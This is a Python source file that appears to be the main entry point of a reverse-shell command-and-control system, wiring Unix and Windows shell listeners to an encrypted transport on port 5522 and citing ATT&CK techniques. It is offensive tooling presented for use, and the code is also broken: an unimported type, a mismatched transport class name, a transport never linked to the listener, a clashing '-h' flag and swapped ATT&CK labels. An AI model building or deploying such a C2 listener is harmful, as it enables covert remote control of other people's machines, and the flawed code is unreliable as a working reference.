from data.code_scripts_PAST.stage3_DIMOS_test_v7_mvp2.TASK_001_models import ListenerConfig, ExecutionResult
from data.code_scripts_PAST.stage3_DIMOS_test_v7_mvp2.TASK_003_unix_reverse_shell import UnixReverseShellListener
from data.code_scripts_PAST.stage3_DIMOS_test_v7_mvp2.TASK_004_windows_reverse_shell import WindowsReverseShellListener
from data.code_scripts_PAST.stage3_DIMOS_test_v7_mvp2.TASK_005_transport import EncryptedSocketTransport
import argparse
import os
import sys


class ReverseShellOrchestrator:
    """Main orchestrator that wires together all components and provides the entry point for the reverse shell system.

    Uses argparse for CLI argument parsing, sys module for exit codes. Creates a ListenerConfig with host='0.0.0.0'
    and port=5522, instantiates the appropriate listener based on OS detection (TASK_003 or TASK_004), wraps it
    with encrypted transport (TASK_005), and starts the event loop.

    ATT&CK techniques: T1059.003, T1059.004
    """

    def __init__(self, host: str = '0.0.0.0', port: int = 5522, password: str = '', os_type: Optional[str] = None):
        self.host = host
        self.port = port
        self.password = password
        self.os_type = os_type

    def _detect_os(self) -> str:
        """Detect the operating system type for listener selection."""
        if self.os_type is not None:
            return self.os_type.lower()
        if os.name == 'nt':
            return 'windows'
        elif sys.platform.startswith('linux'):
            return 'unix'
        elif sys.platform.startswith('darwin'):
            return 'unix'
        else:
            return 'unix'

    def _create_listener(self) -> UnixReverseShellListener | WindowsReverseShellListener:
        """Create the appropriate listener based on OS detection."""
        os_type = self._detect_os()
        if os_type == 'windows':
            return WindowsReverseShellListener(
                config=ListenerConfig(host=self.host, port=self.port, timeout=30.0)
            )
        else:
            return UnixReverseShellListener(
                config=ListenerConfig(host=self.host, port=self.port, timeout=30.0)
            )

    def _wrap_with_encrypted_transport(self, listener: UnixReverseShellListener | WindowsReverseShellListener) -> EncryptedSocketTransportServer:
        """Wrap the listener with encrypted transport layer."""
        return EncryptedSocketTransportServer(
            host=self.host,
            port=self.port,
            password=self.password
        )

    def run(self) -> int:
        """Run the reverse shell orchestrator. Returns exit code (0 for success)."""
        try:
            print(f"[+] ReverseShellOrchestrator initialized")
            print(f"[*] Host: {self.host}, Port: {self.port}")

            # Create listener based on OS detection
            listener = self._create_listener()
            print(f"[*] Detected OS type: {listener.__class__.__name__}")

            # Wrap with encrypted transport
            transport = self._wrap_with_encrypted_transport(listener)
            print("[+] Encrypted transport layer initialized")

            # Start the event loop
            listener.start()
            print(f"[+] Listening on {self.host}:{self.port}...")
            print("[+] Press Ctrl+C to stop the server.")

            try:
                while True:
                    import time
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
            finally:
                listener.stop()
                transport.disconnect()
                print("[*] Server stopped gracefully.")
                return 0

        except Exception as e:
            print(f"[-] Error: {e}")
            return 1


def main():
    """Main entry point for the reverse shell system."""
    parser = argparse.ArgumentParser(
        description='Reverse Shell Orchestrator - C2 Communication System',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ATT&CK Techniques:
  T1059.003 - Command and Scripting Interpreter: Unix Shell
  T1059.004 - Command and Scripting Interpreter: Windows Command Shell

Usage: python main.py [--host HOST] [--port PORT] [--password PASSWORD] [--os TYPE]
        """
    )

    parser.add_argument(
        '--host', '-h',
        type=str,
        default='0.0.0.0',
        help='Host address to bind the listener (default: 0.0.0.0)'
    )
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=5522,
        help='Port to listen on (default: 5522)'
    )
    parser.add_argument(
        '--password', '-w',
        type=str,
        default='',
        help='Password for encrypted transport'
    )
    parser.add_argument(
        '--os', '-o',
        type=str,
        choices=['unix', 'windows'],
        default=None,
        help='Force OS type (auto-detected if not specified)'
    )

    args = parser.parse_args()

    orchestrator = ReverseShellOrchestrator(
        host=args.host,
        port=args.port,
        password=args.password,
        os_type=args.os
    )

    exit_code = orchestrator.run()
    sys.exit(exit_code)


if __name__ == '__main__':
    main()
